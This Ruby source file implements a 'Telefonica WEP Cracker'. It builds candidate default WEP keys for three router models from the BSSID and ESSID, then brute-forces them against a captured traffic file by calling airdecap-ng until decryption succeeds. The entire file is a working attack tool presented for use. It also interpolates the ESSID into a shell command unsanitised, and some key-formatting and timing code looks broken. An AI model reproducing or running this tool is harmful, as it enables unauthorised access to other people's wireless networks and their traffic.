class WepCracker

  def initialize(options)

    @bssid ||= options[:bssid]
    @essid ||= options[:essid]
    @file ||= options[:file]

    @options = generate_options
    
  end

  def crack!

    rate = 0
    eta = 0
    counter = 0
    starting_at = Time.now
    len = @options.length
    @options.shuffle.each do |option|
      a = `airdecap-ng -w #{option.unpack('H*')} #{@file} -e #{@essid}`
      if a.match(/\nNumber of decrypted WEP  packets[\s]+[^0]+\n/) then
        puts "Decrypted packet from #{@essid} (BSSID: #{@bssid} with key #{option} !"
        exit(0)
      end
      counter += 1

      rate = (counter / (Time.now - starting_at).to_f).to_i
      eta = sec2hms((len - counter) / rate.to_f)
      elapsed = sec2hms(Time.now.sec - starting_at.sec.to_f)
      system("clear")
      puts "Telefonica WEP Cracker 0.1 Alpha Release"
      puts "Tried #{counter} keys... out of #{len}"
      puts "#{rate} keys/sec | ETA: #{humanize_time(eta)} | Elapsed: #{humanize_time(elapsed)}"
    end
    puts "\n\nSorry, this access point must have changed the default password: it couldn't be cracked."

  end

  private

  def generate_options

    start = @bssid.gsub(':','')[0..6].upcase

    begin
      letter = get_letter_from(start)
    rescue=>e
      puts "There has been an error: #{e}"
    end  

    ending = @essid.split('_').last.upcase

    number_options = []
    options = []

    16.times do |f|
      16.times do |s|
        16.times do |t|
          number_options << [f.to_s(16),s.to_s(16),t.to_s(16)]
        end
      end
    end

    number_options.each do |n|
      options << "#{letter}#{start}#{n.join.upcase}#{ending}"
    end

    return options

  end

  def get_letter_from(number)
    case number
    when /^001349/
      return "Z"
    when /^0030DA/
      return "C"
    when /^000138/
      return "X"
    else
      raise "Unfortunately, this BSSID doesn't belong to any of the three supported router models."
      exit(0)
    end
  end

  def sec2hms(secs)
    time = secs.round
    sec = time % 60.to_i
    time /= 60
    mins = time % 60
    time /= 60
    hrs = time % 24
    [hrs,mins,sec]
  end

  def humanize_time(hms)
    seconds = "#{hms[2]} second"
    seconds += 's' if hms[2] != 1
    minutes = "#{hms[1]} minute"
    minutes += 's' if hms[1] != 1
    minutes += ' and '
    hours = "#{hms[0]} hour"
    hours += 's' if hms[0] != 1
    hours += ', '
    "#{hours}#{minutes}#{seconds}"
  end


end
